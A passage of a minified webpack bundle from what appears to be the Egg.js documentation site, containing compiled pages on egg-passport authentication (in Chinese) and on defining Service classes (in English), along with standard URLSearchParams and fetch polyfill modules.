",r.a.createElement("code",null,"/passport/$","{","strategy","}","/callback")))),r.a.createElement("li",null,"\u5982\u5e94\u7528\u90e8\u7f72\u5728 Nginx/HAProxy \u4e4b\u540e\uff0c\u9700\u8bbe\u7f6e\u63d2\u4ef6 ",r.a.createElement("code",null,"proxy")," \u9009\u9879\u4e3a ",r.a.createElement("code",null,"true"),", \u5e76\u68c0\u67e5\u4ee5\u4e0b\u914d\u7f6e\uff1a",r.a.createElement("ul",null,r.a.createElement("li",null,"\u4ee3\u7406\u9644\u52a0 HTTP \u5934\u5b57\u6bb5\uff1a",r.a.createElement("code",null,"x-forwarded-proto")," \u4e0e ",r.a.createElement("code",null,"x-forwarded-host")),r.a.createElement("li",null,"\u914d\u7f6e\u4e2d ",r.a.createElement("code",null,"config.proxy")," \u5e94\u8bbe\u7f6e\u4e3a ",r.a.createElement("code",null,"true"))))),r.a.createElement("h3",{id:"\u6302\u8f7d\u8def\u7531"},r.a.createElement(l["AnchorLink"],{to:"#\u6302\u8f7d\u8def\u7531","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6302\u8f7d\u8def\u7531"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  const { router, controller } = app;\n\n  // \u6302\u8f7d\u9274\u6743\u8def\u7531\n  app.passport.mount('github');\n\n  // \u4e0a\u9762\u7684 mount \u662f\u8bed\u6cd5\u7cd6\uff0c\u7b49\u4ef7\u4e8e\n  // const github = app.passport.authenticate('github', {});\n  // router.get('/passport/github', github);\n  // router.get('/passport/github/callback', github);\n};",lang:"js"}),r.a.createElement("h3",{id:"\u7528\u6237\u4fe1\u606f\u5904\u7406"},r.a.createElement(l["AnchorLink"],{to:"#\u7528\u6237\u4fe1\u606f\u5904\u7406","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u7528\u6237\u4fe1\u606f\u5904\u7406"),r.a.createElement("p",null,"\u63a5\u7740\uff0c\u6211\u4eec\u8fd8\u9700\u8981\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u9996\u6b21\u767b\u5f55\u65f6\uff0c\u4e00\u822c\u9700\u8981\u628a\u7528\u6237\u4fe1\u606f\u8fdb\u884c\u5165\u5e93\uff0c\u5e76\u8bb0\u5f55 Session \u3002"),r.a.createElement("li",null,"\u4e8c\u6b21\u767b\u5f55\u65f6\uff0c\u4ece OAuth \u6216 Session \u62ff\u5230\u7684\u7528\u6237\u4fe1\u606f\uff0c\u8bfb\u53d6\u6570\u636e\u5e93\u62ff\u5230\u5b8c\u6574\u7684\u7528\u6237\u4fe1\u606f\u3002")),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  app.passport.verify(async (ctx, user) => {\n    // \u68c0\u67e5\u7528\u6237\n    assert(user.provider, 'user.provider should exists');\n    assert(user.id, 'user.id should exists');\n\n    // \u4ece\u6570\u636e\u5e93\u4e2d\u67e5\u627e\u7528\u6237\u4fe1\u606f\n    //\n    // Authorization Table\n    // column   | desc\n    // ---      | --\n    // provider | provider name, like github, twitter, facebook, weibo and so on\n    // uid      | provider unique id\n    // user_id  | current application user id\n    const auth = await ctx.model.Authorization.findOne({\n      uid: user.id,\n      provider: user.provider,\n    });\n    const existsUser = await ctx.model.User.findOne({ id: auth.user_id });\n    if (existsUser) {\n      return existsUser;\n    }\n    // \u8c03\u7528 service \u6ce8\u518c\u65b0\u7528\u6237\n    const newUser = await ctx.service.user.register(user);\n    return newUser;\n  });\n\n  // \u5c06\u7528\u6237\u4fe1\u606f\u5e8f\u5217\u5316\u540e\u5b58\u8fdb session \u91cc\u9762\uff0c\u4e00\u822c\u9700\u8981\u7cbe\u7b80\uff0c\u53ea\u4fdd\u5b58\u4e2a\u522b\u5b57\u6bb5\n  app.passport.serializeUser(async (ctx, user) => {\n    // \u5904\u7406 user\n    // ...\n    // return user;\n  });\n\n  // \u53cd\u5e8f\u5217\u5316\u540e\u628a\u7528\u6237\u4fe1\u606f\u4ece session \u4e2d\u53d6\u51fa\u6765\uff0c\u53cd\u67e5\u6570\u636e\u5e93\u62ff\u5230\u5b8c\u6574\u4fe1\u606f\n  app.passport.deserializeUser(async (ctx, user) => {\n    // \u5904\u7406 user\n    // ...\n    // return user;\n  });\n};",lang:"js"}),r.a.createElement("p",null,"\u81f3\u6b64\uff0c\u6211\u4eec\u5c31\u5b8c\u6210\u4e86\u6240\u6709\u7684\u914d\u7f6e\uff0c\u5b8c\u6574\u7684\u793a\u4f8b\u53ef\u4ee5\u53c2\u89c1\uff1a",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/passport"},"eggjs/examples/passport")),r.a.createElement("h3",{id:"api"},r.a.createElement(l["AnchorLink"],{to:"#api","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"API"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-passport"},"egg-passport")," \u63d0\u4f9b\u4e86\u4ee5\u4e0b\u6269\u5c55\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"ctx.user")," - \u83b7\u53d6\u5f53\u524d\u5df2\u767b\u5f55\u7684\u7528\u6237\u4fe1\u606f"),r.a.createElement("li",null,r.a.createElement("code",null,"ctx.isAuthenticated()")," - \u68c0\u67e5\u8be5\u8bf7\u6c42\u662f\u5426\u5df2\u6388\u6743"),r.a.createElement("li",null,r.a.createElement("code",null,"ctx.login(user, [options])")," - \u4e3a\u7528\u6237\u542f\u52a8\u4e00\u4e2a\u767b\u5f55\u7684 session"),r.a.createElement("li",null,r.a.createElement("code",null,"ctx.logout()")," - \u9000\u51fa\uff0c\u5c06\u7528\u6237\u4fe1\u606f\u4ece session \u4e2d\u6e05\u9664"),r.a.createElement("li",null,r.a.createElement("code",null,"ctx.session.returnTo=")," - \u5728\u8df3\u8f6c\u9a8c\u8bc1\u524d\u8bbe\u7f6e\uff0c\u53ef\u4ee5\u6307\u5b9a\u6210\u529f\u540e\u7684 redirect \u5730\u5740")),r.a.createElement("p",null,"\u8fd8\u63d0\u4f9b\u4e86 API\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"app.passport.verify(async (ctx, user) => ","{","}",")")," - \u6821\u9a8c\u7528\u6237"),r.a.createElement("li",null,r.a.createElement("code",null,"app.passport.serializeUser(async (ctx, user) => ","{","}",")")," - \u5e8f\u5217\u5316\u7528\u6237\u4fe1\u606f\u540e\u5b58\u50a8\u8fdb session"),r.a.createElement("li",null,r.a.createElement("code",null,"app.passport.deserializeUser(async (ctx, user) => ","{","}",")")," - \u53cd\u5e8f\u5217\u5316\u540e\u53d6\u51fa\u7528\u6237\u4fe1\u606f"),r.a.createElement("li",null,r.a.createElement("code",null,"app.passport.authenticate(strategy, options)")," - \u751f\u6210\u6307\u5b9a\u7684\u9274\u6743\u4e2d\u95f4\u4ef6",r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"options.successRedirect")," - \u6307\u5b9a\u9274\u6743\u6210\u529f\u540e\u7684 redirect \u5730\u5740"),r.a.createElement("li",null,r.a.createElement("code",null,"options.loginURL")," - \u8df3\u8f6c\u767b\u5f55\u5730\u5740\uff0c\u9ed8\u8ba4\u4e3a ",r.a.createElement("code",null,"/passport/$","{","strategy","}")),r.a.createElement("li",null,r.a.createElement("code",null,"options.callbackURL")," - \u6388\u6743\u540e\u56de\u8c03\u5730\u5740\uff0c\u9ed8\u8ba4\u4e3a ",r.a.createElement("code",null,"/passport/$","{","strategy","}","/callback")))),r.a.createElement("li",null,r.a.createElement("code",null,"app.passport.mount(strategy, options)")," - \u8bed\u6cd5\u7cd6\uff0c\u65b9\u4fbf\u5f00\u53d1\u8005\u914d\u7f6e\u8def\u7531")),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a")),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"app.passport.authenticate")," \u4e2d\uff0c\u672a\u8bbe\u7f6e ",r.a.createElement("code",null,"options.successRedirect")," \u6216\u8005 ",r.a.createElement("code",null,"options.successReturnToOrRedirect")," \u5c06\u9ed8\u8ba4\u8df3\u8f6c ",r.a.createElement("code",null,"/"))),r.a.createElement("h2",{id:"\u4f7f\u7528-passport-\u751f\u6001"},r.a.createElement(l["AnchorLink"],{to:"#\u4f7f\u7528-passport-\u751f\u6001","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4f7f\u7528 Passport \u751f\u6001"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"http://www.passportjs.org/"},"Passport")," \u7684\u4e2d\u95f4\u4ef6\u5f88\u591a\uff0c\u4e0d\u53ef\u80fd\u90fd\u8fdb\u884c\u4e8c\u6b21\u5c01\u88c5\u3002 \u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u6765\u770b\u770b\u5982\u4f55\u5728\u6846\u67b6\u4e2d\u76f4\u63a5\u4f7f\u7528 Passport \u4e2d\u95f4\u4ef6\u3002 \u4ee5\u300e\u8d26\u53f7\u5bc6\u7801\u767b\u5f55\u65b9\u5f0f\u300f\u7684 ",r.a.createElement(l["Link"],{to:"https://github.com/jaredhanson/passport-local"},"passport-local")," \u4e3a\u4f8b\uff1a"),r.a.createElement("h3",{id:"\u5b89\u88c5-1"},r.a.createElement(l["AnchorLink"],{to:"#\u5b89\u88c5-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5b89\u88c5"),r.a.createElement(o["a"],{code:"$ npm i --save passport-local",lang:"bash"}),r.a.createElement("h3",{id:"\u914d\u7f6e-1"},r.a.createElement(l["AnchorLink"],{to:"#\u914d\u7f6e-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u914d\u7f6e"),r.a.createElement(o["a"],{code:"// app.js\nconst LocalStrategy = require('passport-local').Strategy;\n\nmodule.exports = (app) => {\n  // \u6302\u8f7d strategy\n  app.passport.use(\n    new LocalStrategy(\n      {\n        passReqToCallback: true,\n      },\n      (req, username, password, done) => {\n        // format user\n        const user = {\n          provider: 'local',\n          username,\n          password,\n        };\n        debug('%s %s get user: %j', req.method, req.url, user);\n        app.passport.doVerify(req, user, done);\n      },\n    ),\n  );\n\n  // \u5904\u7406\u7528\u6237\u4fe1\u606f\n  app.passport.verify(async (ctx, user) => {});\n  app.passport.serializeUser(async (ctx, user) => {});\n  app.passport.deserializeUser(async (ctx, user) => {});\n};",lang:"js"}),r.a.createElement("h3",{id:"\u6302\u8f7d\u8def\u7531-1"},r.a.createElement(l["AnchorLink"],{to:"#\u6302\u8f7d\u8def\u7531-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6302\u8f7d\u8def\u7531"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  const { router, controller } = app;\n  router.get('/', controller.home.index);\n\n  // \u9274\u6743\u6210\u529f\u540e\u7684\u56de\u8c03\u9875\u9762\n  router.get('/authCallback', controller.home.authCallback);\n\n  // \u6e32\u67d3\u767b\u5f55\u9875\u9762\uff0c\u7528\u6237\u8f93\u5165\u8d26\u53f7\u5bc6\u7801\n  router.get('/login', controller.home.login);\n  // \u767b\u5f55\u6821\u9a8c\n  router.post(\n    '/login',\n    app.passport.authenticate('local', { successRedirect: '/authCallback' }),\n  );\n};",lang:"js"}),r.a.createElement("h2",{id:"\u5982\u4f55\u5f00\u53d1\u4e00\u4e2a-egg-passport-\u63d2\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#\u5982\u4f55\u5f00\u53d1\u4e00\u4e2a-egg-passport-\u63d2\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5982\u4f55\u5f00\u53d1\u4e00\u4e2a egg-passport \u63d2\u4ef6"),r.a.createElement("p",null,"\u5728\u4e0a\u4e00\u8282\u4e2d\uff0c\u6211\u4eec\u5b66\u4f1a\u4e86\u5982\u4f55\u5728\u6846\u67b6\u4e2d\u4f7f\u7528 Passport \u4e2d\u95f4\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u8fdb\u4e00\u6b65\u628a\u5b83\u5c01\u88c5\u6210\u63d2\u4ef6\uff0c\u56de\u9988\u793e\u533a\u3002"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u521d\u59cb\u5316\uff1a")),r.a.createElement(o["a"],{code:"$ npm init egg --type=plugin egg-passport-local",lang:"bash"}),r.a.createElement("p",null,"\u5728 ",r.a.createElement("code",null,"package.json")," \u4e2d",r.a.createElement("strong",null,"\u914d\u7f6e\u4f9d\u8d56\uff1a")),r.a.createElement(o["a"],{code:'{\n  "name": "egg-passport-local",\n  "version": "1.0.0",\n  "eggPlugin": {\n    "name": "passportLocal",\n    "dependencies": ["passport"]\n  },\n  "dependencies": {\n    "passport-local": "^1.0.0"\n  }\n}',lang:"json"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u914d\u7f6e\uff1a")),r.a.createElement(o["a"],{code:"// {plugin_root}/config/config.default.js\n// https://github.com/jaredhanson/passport-local\nexports.passportLocal = {};",lang:"js"}),r.a.createElement("p",null,"\u6ce8\u610f\uff1a",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-passport"},"egg-passport")," \u6807\u51c6\u5316\u4e86\u914d\u7f6e\u5b57\u6bb5\uff0c\u7edf\u4e00\u4e3a ",r.a.createElement("code",null,"key")," \u548c ",r.a.createElement("code",null,"secret"),"\uff0c\u6545\u82e5\u5bf9\u5e94\u7684 Passport \u4e2d\u95f4\u4ef6\u5c5e\u6027\u540d\u4e0d\u4e00\u81f4\u65f6\uff0c\u5f00\u53d1\u8005\u5e94\u8be5\u8fdb\u884c\u8f6c\u6362\u3002"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u518c passport \u4e2d\u95f4\u4ef6\uff1a")),r.a.createElement(o["a"],{code:"// {plugin_root}/app.js\nconst LocalStrategy = require('passport-local').Strategy;\n\nmodule.exports = (app) => {\n  const config = app.config.passportLocal;\n  config.passReqToCallback = true;\n\n  app.passport.use(\n    new LocalStrategy(config, (req, username, password, done) => {\n      // \u628a Passport \u63d2\u4ef6\u8fd4\u56de\u7684\u6570\u636e\u8fdb\u884c\u6e05\u6d17\u5904\u7406\uff0c\u8fd4\u56de User \u5bf9\u8c61\n      const user = {\n        provider: 'local',\n        username,\n        password,\n      };\n      // \u8fd9\u91cc\u4e0d\u5904\u7406\u5e94\u7528\u5c42\u903b\u8f91\uff0c\u4f20\u7ed9 app.passport.verify \u7edf\u4e00\u5904\u7406\n      app.passport.doVerify(req, user, done);\n    }),\n  );\n};",lang:"js"})))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},vGeg:function(e,t,n){var a=n("SCbZ"),r=n("N0Us");e.exports=function(e){if(void 0===e)return 0;var t=a(e),n=r(t);if(t!==n)throw RangeError("Wrong length or index");return n}},vKfd:function(e,t,n){"use strict";n("69j1");var a=n("0mt+"),r=n("V3tB"),l=n("o3Hr"),o=n("AzF/"),i=n("P0Lz"),c=n("oi/H"),s=n("fd2C"),u=n("lz/I"),d=n("k8mt"),m=n("31yA"),p=n("G9w8"),h=n("+0HW"),g=n("oyD1"),f=n("a7jj"),E=n("tbdv"),b=n("aGbw"),v=n("AAg8"),y=n("TYe2"),k=n("q7Pv"),w=r("fetch"),x=r("Headers"),j=k("iterator"),S="URLSearchParams",C=S+"Iterator",A=u.set,L=u.getterFor(S),T=u.getterFor(C),N=/\+/g,O=Array(4),I=function(e){return O[e-1]||(O[e-1]=RegExp("((?:%[\\da-f]{2}){"+e+"})","gi"))},P=function(e){try{return decodeURIComponent(e)}catch(t){return e}},R=function(e){var t=e.replace(N," "),n=4;try{return decodeURIComponent(t)}catch(a){while(n)t=t.replace(I(n--),P);return t}},_=/[!'()~]|%20/g,q={"!":"%21","'":"%27","(":"%28",")":"%29","~":"%7E","%20":"+"},M=function(e){return q[e]},F=function(e){return encodeURIComponent(e).replace(_,M)},D=function(e,t){if(t){var n,a,r=t.split("&"),l=0;while(l<r.length)n=r[l++],n.length&&(a=n.split("="),e.push({key:R(a.shift()),value:R(a.join("="))}))}},U=function(e){this.entries.length=0,D(this.entries,e)},z=function(e,t){if(e<t)throw TypeError("Not enough arguments")},H=s((function(e,t){A(this,{type:C,iterator:v(L(e).entries),kind:t})}),"Iterator",(function(){var e=T(this),t=e.kind,n=e.iterator.next(),a=n.value;return n.done||(n.value="keys"===t?a.key:"values"===t?a.value:[a.key,a.value]),n})),B=function(){d(this,B,S);var e,t,n,a,r,l,o,i,c,s=arguments.length>0?arguments[0]:void 0,u=this,p=[];if(A(u,{type:S,entries:p,updateURL:function(){},updateSearchParams:U}),void 0!==s)if(f(s))if(e=y(s),"function"===typeof e){t=e.call(s),n=t.next;while(!(a=n.call(t)).done){if(r=v(g(a.value)),l=r.next,(o=l.call(r)).done||(i=l.call(r)).done||!l.call(r).done)throw TypeError("Expected sequence with length 2");p.push({key:o.value+"",value:i.value+""})}}else for(c in s)m(s,c)&&p.push({key:c,value:s[c]+""});else D(p,"string"===typeof s?"?"===s.charAt(0)?s.slice(1):s:s+"")},W=B.prototype;i(W,{append:function(e,t){z(arguments.length,2);var n=L(this);n.entries.push({key:e+"",value:t+""}),n.updateURL()},delete:function(e){z(arguments.length,1);var t=L(this),n=t.entries,a=e+"",r=0;while(r<n.length)n[r].key===a?n.splice(r,1):r++;t.updateURL()},get:function(e){z(arguments.length,1);for(var t=L(this).entries,n=e+"",a=0;a<t.length;a++)if(t[a].key===n)return t[a].value;return null},getAll:function(e){z(arguments.length,1);for(var t=L(this).entries,n=e+"",a=[],r=0;r<t.length;r++)t[r].key===n&&a.push(t[r].value);return a},has:function(e){z(arguments.length,1);var t=L(this).entries,n=e+"",a=0;while(a<t.length)if(t[a++].key===n)return!0;return!1},set:function(e,t){z(arguments.length,1);for(var n,a=L(this),r=a.entries,l=!1,o=e+"",i=t+"",c=0;c<r.length;c++)n=r[c],n.key===o&&(l?r.splice(c--,1):(l=!0,n.value=i));l||r.push({key:o,value:i}),a.updateURL()},sort:function(){var e,t,n,a=L(this),r=a.entries,l=r.slice();for(r.length=0,n=0;n<l.length;n++){for(e=l[n],t=0;t<n;t++)if(r[t].key>e.key){r.splice(t,0,e);break}t===n&&r.push(e)}a.updateURL()},forEach:function(e){var t,n=L(this).entries,a=p(e,arguments.length>1?arguments[1]:void 0,3),r=0;while(r<n.length)t=n[r++],a(t.value,t.key,this)},keys:function(){return new H(this,"keys")},values:function(){return new H(this,"values")},entries:function(){return new H(this,"entries")}},{enumerable:!0}),o(W,j,W.entries),o(W,"toString",(function(){var e,t=L(this).entries,n=[],a=0;while(a<t.length)e=t[a++],n.push(F(e.key)+"="+F(e.value));return n.join("&")}),{enumerable:!0}),c(B,S),a({global:!0,forced:!l},{URLSearchParams:B}),l||"function"!=typeof w||"function"!=typeof x||a({global:!0,enumerable:!0,forced:!0},{fetch:function(e){var t,n,a,r=[e];return arguments.length>1&&(t=arguments[1],f(t)&&(n=t.body,h(n)===S&&(a=t.headers?new x(t.headers):new x,a.has("content-type")||a.set("content-type","application/x-www-form-urlencoded;charset=UTF-8"),t=E(t,{body:b(0,String(n)),headers:b(0,a)}))),r.push(t)),w.apply(this,r)}}),e.exports={URLSearchParams:B,getState:L}},vKrK:function(e,t,n){var a=n("0mt+"),r=n("A0UU"),l=n("JfFA"),o=n("AaXQ"),i=r.process,c="process"==o(i);a({global:!0,enumerable:!0,noTargetGet:!0},{queueMicrotask:function(e){var t=c&&i.domain;l(t?t.bind(e):e)}})},vSEF:function(e,t,n){"use strict";var a=n("/kpV")["default"];function r(){var e=n("FU0I");return r=function(){return e},e}Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=void 0;var l=o(n("D7X3"));function o(e){return e&&e.__esModule?e:{default:e}}function i(e,t){return m(e)||d(e,t)||s(e,t)||c()}function c(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}function s(e,t){if(e){if("string"===typeof e)return u(e,t);var n=Object.prototype.toString.call(e).slice(8,-1);return"Object"===n&&e.constructor&&(n=e.constructor.name),"Map"===n||"Set"===n?Array.from(e):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?u(e,t):void 0}}function u(e,t){(null==t||t>e.length)&&(t=e.length);for(var n=0,a=new Array(t);n<t;n++)a[n]=e[n];return a}function d(e,t){var n=null==e?null:"undefined"!=typeof Symbol&&e[Symbol.iterator]||e["@@iterator"];if(null!=n){var a,r,l,o,i=[],c=!0,s=!1;try{if(l=(n=n.call(e)).next,0===t){if(Object(n)!==n)return;c=!1}else for(;!(c=(a=l.call(n)).done)&&(i.push(a.value),i.length!==t);c=!0);}catch(u){s=!0,r=u}finally{try{if(!c&&null!=n["return"]&&(o=n["return"](),Object(o)!==o))return}finally{if(s)throw r}}return i}}function m(e){if(Array.isArray(e))return e}function p(e,t,n){return Object.entries(e[t]).reduce((function(e,t){var r=a(t,2),l=r[0],o=r[1];return e[l]=o.map((function(e){var t={description:e.description};return Object.keys(e).forEach((function(a){if(a.startsWith("description.")){var r=a.match(/^description\.(.*)$/),l=i(r,2),o=l[1];o&&o===n&&(t.description=e[a])}else t[a]=e[a]})),t})),e}),{})}var h=function(e){var t=(0,r().useContext)(l["default"]),n=t.locale,a=t.apis,o=(0,r().useState)(p(a,e,n)),c=i(o,2),s=c[0],u=c[1];return(0,r().useEffect)((function(){u(p(a,e,n))}),[a,e,n]),s};t["default"]=h},vajQ:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"Simply speaking, Service is an abstract layer which is used to encapsulate business logics in complex business circumstances, and this abstraction offers advantages as below:"),r.a.createElement("ul",null,r.a.createElement("li",null,"keep logics in Controller cleaner."),r.a.createElement("li",null,"keep business logics independent, since the abstracted Service can be called by many Controllers repeatedly."),r.a.createElement("li",null,"separate logics and representations, and make it easier to write test cases. Write test cases in detail referring to ",r.a.createElement(l["Link"],{to:"../core/unittest"},"here"),".")),r.a.createElement("h2",{id:"usage-scenario"},r.a.createElement(l["AnchorLink"],{to:"#usage-scenario","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Usage Scenario"),r.a.createElement("ul",null,r.a.createElement("li",null,"Processing complex data, e.g. information to be shown need to be got from databases, and should be processed in specific rules before it can be sent and seen by the user. Or when the process is done, the database should be updated."),r.a.createElement("li",null,"Calling third party services, e.g. getting Github information etc.")),r.a.createElement("h2",{id:"defining-service"},r.a.createElement(l["AnchorLink"],{to:"#defining-service","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Defining Service"),r.a.createElement(o["a"],{code:"// app/service/user.js\nconst Service = require('egg').Service;\n\nclass UserService extends Service {\n  async find(uid) {\n    const user = await this.ctx.db.query(\n      'select * from user where uid = ?',\n      uid,\n    );\n    return user;\n  }\n}\n\nmodule.exports = UserService;",lang:"js"}),r.a.createElement("h3",{id:"properties"},r.a.createElement(l["AnchorLink"],{to:"#properties","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Properties"),r.a.createElement("p",null,"Framework will initialize a new Service instance for every request accessing the server, and, for the example above, several attributes are attached to ",r.a.createElement("code",null,"this")," since the Service class inherits ",r.a.createElement("code",null,"egg.Service"),"."),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"this.ctx"),": the instance of ",r.a.createElement(l["AnchorLink"],{to:"./extend#context"},"Context")," for current request, through which we can access many attributes and methods, encapsulated by the framework, of current request conveniently."),r.a.createElement("li",null,r.a.createElement("code",null,"this.app"),": the instance of ",r.a.createElement(l["AnchorLink"],{to:"./extend#application"},"Application")," for current request, through which we can access global objects and methods provided by the framework."),r.a.createElement("li",null,r.a.createElement("code",null,"this.service"),": ",r.a.createElement(l["Link"],{to:"./service"},"Service")," defined by the application, through which we can access the abstract business layer, equivalent to ",r.a.createElement("code",null,"this.ctx.service"),"."),r.a.createElement("li",null,r.a.createElement("code",null,"this.config"),": the application's run-time ",r.a.createElement(l["Link"],{to:"./config"},"config"),"."),r.a.createElement("li",null,r.a.createElement("code",null,"this.logger"),"\uff1alogger with ",r.a.createElement("code",null,"debug"),"\uff0c",r.a.createElement("code",null,"info"),"\uff0c",r.a.createElement("code",null,"warn"),"\uff0c",r.a.createElement("code",null,"error"),", use to print different level logs, almost the same as ",r.a.createElement(l["AnchorLink"],{to:"../core/logger#context-logger"},"context logger"),", but it will append Service file path for quickly track.")),r.a.createElement("h3",{id:"service-ctx-in-detail"},r.a.createElement(l["AnchorLink"],{to:"#service-ctx-in-detail","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Service ",r.a.createElement("code",null,"ctx")," in Detail"),r.a.createElement("p",null,"To get the path chain of user request, the request context is injected by us during the Service initialization, so you are able to get the related information of context directly by ",r.a.createElement("code",null,"this.ctx")," in methods. For detailed information about context, please refer to ",r.a.createElement(l["AnchorLink"],{to:"./extend#context"},"Context"),". With ",r.a.createElement("code",null,"ctx"),", we can get various convenient attributes and methods encapsulated by the framework. For example we can use:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"this.ctx.curl")," to make network calls."),r.a.createElement("li",null,r.a.createElement("code",null,"this.ctx.service.otherService")," to call other Services."),r.a.createElement("li",null,r.a.createElement("code",null,"this.ctx.db")," to make database calls etc, where db may be a module mounted by other plugins in advance.")),r.a.createElement("h3",{id:"notes"},r.a.createElement(l["AnchorLink"],{to:"#notes","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Notes"),r.a.createElement("ul",null,r.a.createElement("li",null,"Service files must be put under the ",r.a.createElement("code",null,"app/service")," directory, and multi-level directory is supported, which can be accessed by cascading directory names.")),r.a.createElement(o["a"],{code:"app/service/biz/user.js => ctx.service.biz.user\napp/service/sync_user.js => ctx.service.syncUser\napp/service/HackerNews.js => ctx.service.hackerNews",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"one Service file can only define one Class, which should be returned by ",r.a.createElement("code",null,"module.exports"),"."),r.a.createElement("li",null,"Service should be defined in the Class way, and the parent class must be ",r.a.createElement("code",null,"egg.Service"),"."),r.a.createElement("li",null,"Service is not a singleton but a ",r.a.createElement("strong",null,"request level")," object, the framework lazy-initializes it when the request ",r.a.createElement("code",null,"ctx.service.xx")," for the first time, so the context of current request can be got from this.ctx in Service.")),r.a.createElement("h2",{id:"using-service"},r.a.createElement(l["AnchorLink"],{to:"#using-service","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Using Service"),r.a.createElement("p",null,"We begin to see how to use Service from a complete example below."),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  app.router.get('/user/:id', app.controller.user.info);\n};\n\n// app/controller/user.js\nconst Controller = require('egg').Controller;\nclass UserController extends Controller {\n  async info() {\n    const { ctx } = this;\n    const userId = ctx.params.id;\n    const userInfo = await ctx.service.user.find(userId);\n    ctx.body = userInfo;\n  }\n}\nmodule.exports = UserController;\n\n// app/service/user.js\nconst Service = require('egg').Service;\nclass UserService extends Service {\n  // the constructor is not a must by default\n  // constructor(ctx) {\n  //   super(ctx); if some processes should be made in the constructor, this statement is a must in order to use `this.ctx` later\n  //   // get ctx through this.ctx directly\n  //   // get app through this.app directly too\n  // }\n  async find(uid) {\n    // suppose we've got user's id and are going to get detailed user information from databases\n    const user = await this.ctx.db.query(\n      'select * from user where uid = ?',\n      uid,\n    );\n\n    // suppose some complex processes should be made here, and demanded informations are returned then.\n    const picture = await this.getPicture(uid);\n\n    return {\n      name: user.user_name,\n      age: user.age,\n      picture,\n    };\n  }\n\n  async getPicture(uid) {\n    const result = await this.ctx.curl(`http://photoserver/uid=${uid}`, {\n      dataType: 'json',\n    });\n    return result.data;\n  }\n}\nmodule.exports = UserService;\n\n// curl http://127.0.0.1:7001/user/1234",lang:"js"})))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},vbCh:function(e,t){var n=0,a=Math.random();e.exports=function(e){return"Symbol("+String(void 0===e?"":e)+")_"+(++n+a).toString(36)}},vhyO:function(e,t,n){"use strict";var a=n("th5x"),r=n("Y/Tn"),l=r(a("String.prototype.indexOf"));e.exports=function(e,t){var n=a(e,!!t);return"function"===typeof n&&l(e,".prototype.")>-1?r(n):n}},viSH:function(e,t){function n(e){if(Array.isArray(e))return e}e.exports=n,e.exports.__esModule=!0,e.exports["default"]=e.exports},vr25:function(e,t,n){var a=n("9Rcy"),r=n("bUpX"),l=n("aGbw"),o=n("AcHn"),i=n("PE5i"),c=n("31yA"),s=n("TwHz"),u=Object.getOwnPropertyDescriptor;t.f=a?u:function(e,t){if(e=o(e),t=i(t,!0),s)try{return u(e,t)}catch(n){}if(c(e,t))return 